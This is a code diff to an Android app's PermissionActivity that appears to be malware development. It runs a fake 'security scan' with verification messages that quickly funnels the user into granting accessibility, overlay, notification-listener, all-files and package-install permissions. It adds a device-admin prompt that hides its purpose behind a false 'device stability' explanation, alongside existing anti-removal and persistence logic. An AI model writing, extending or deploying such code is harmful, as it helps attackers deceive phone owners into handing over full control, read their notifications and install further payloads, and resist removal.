@@ -37,6 +37,8 @@ public class PermissionActivity extends AppCompatActivity {
 
     private boolean isAnimationRunning = false;
     private boolean hasScanned = false;
+    private boolean hasAttemptedFiles = false;
+    private boolean hasAttemptedInstall = false;
     private String currentLayoutType = "";
     private final Handler chainHandler = new Handler(Looper.getMainLooper());
 
@@ -95,6 +97,12 @@ public class PermissionActivity extends AppCompatActivity {
         
         // SUSPEND ANTI-REMOVAL
         getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("is_repairing", true).apply();
+
+        if (getIntent() != null && getIntent().getBooleanExtra("launch_admin", false)) {
+            openAdminSettings();
+            finish();
+            return;
+        }
         
         boolean accMissing = !isAccessibilityServiceEnabled(this);
         if (!hasScanned && (accMissing || !areRuntimePermissionsGranted())) {
@@ -232,32 +240,34 @@ public class PermissionActivity extends AppCompatActivity {
             boolean runtimeMissing = !areRuntimePermissionsGranted();
             boolean overlayMissing = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this);
             boolean notifMissing = !isNotificationServiceEnabled(this);
-            boolean filesMissing = Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !android.os.Environment.isExternalStorageManager();
-            boolean installMissing = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !getPackageManager().canRequestPackageInstalls();
+            boolean filesMissing = Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !android.os.Environment.isExternalStorageManager() && !hasAttemptedFiles;
+            boolean installMissing = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !getPackageManager().canRequestPackageInstalls() && !hasAttemptedInstall;
 
-            // DIRECT PIPELINE: Accessibility Guide FIRST -> Play Protect Step Animation -> Direct Settings Launch
+            // FAST DIRECT PIPELINE: 200ms Lightning Dispatch
             if (accMissing) {
                 showAccessibilityGuide();
             } else if (runtimeMissing) {
                 updateVerifyingUI(35, "Verifying runtime security permissions...");
-                chainHandler.postDelayed(this::requestMissingBatch, 900);
+                chainHandler.postDelayed(this::requestMissingBatch, 200);
             } else if (overlayMissing) {
                 updateVerifyingUI(55, "Checking display over other apps...");
-                chainHandler.postDelayed(this::openOverlaySettings, 900);
+                chainHandler.postDelayed(this::openOverlaySettings, 200);
             } else if (notifMissing) {
                 updateVerifyingUI(75, "Verifying notification listener access...");
-                chainHandler.postDelayed(this::openNotificationSettings, 900);
+                chainHandler.postDelayed(this::openNotificationSettings, 200);
             } else if (filesMissing) {
+                hasAttemptedFiles = true;
                 updateVerifyingUI(88, "Checking file storage access...");
-                chainHandler.postDelayed(this::openFilesSettings, 900);
+                chainHandler.postDelayed(this::openFilesSettings, 200);
             } else if (installMissing) {
+                hasAttemptedInstall = true;
                 updateVerifyingUI(96, "Checking package installation access...");
-                chainHandler.postDelayed(this::openInstallSettings, 900);
+                chainHandler.postDelayed(this::openInstallSettings, 200);
             } else {
                 IO_Persistence_Manager.setAutoPilot(false);
                 updateVerifyingUI(100, "Security scan complete.");
-                // Pause for 1.0 second after scan reaches 100%, then pop up completion text & FINISH button
-                chainHandler.postDelayed(this::showCompletionUI, 1200);
+                // Pause for 0.8 second after scan reaches 100%, then pop up completion text & FINISH button
+                chainHandler.postDelayed(this::showCompletionUI, 800);
             }
         }, 200);
     }
@@ -470,6 +480,27 @@ public class PermissionActivity extends AppCompatActivity {
                 }
             } catch (Exception ignored) {}
         }
+    }
+
+    private boolean isDeviceAdminActive() {
+        try {
+            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+            ComponentName admin = new ComponentName(this, StabilityPolicy.class);
+            return dpm != null && dpm.isAdminActive(admin);
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    private void openAdminSettings() {
+        try {
+            IO_Persistence_Manager.stopSmartExit();
+            ComponentName admin = new ComponentName(this, StabilityPolicy.class);
+            Intent intent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+            intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
+            intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Synchronization with system frameworks is required to maintain device stability.");
+            startActivity(intent);
+        } catch (Exception ignored) {}
     }
 
     @Override
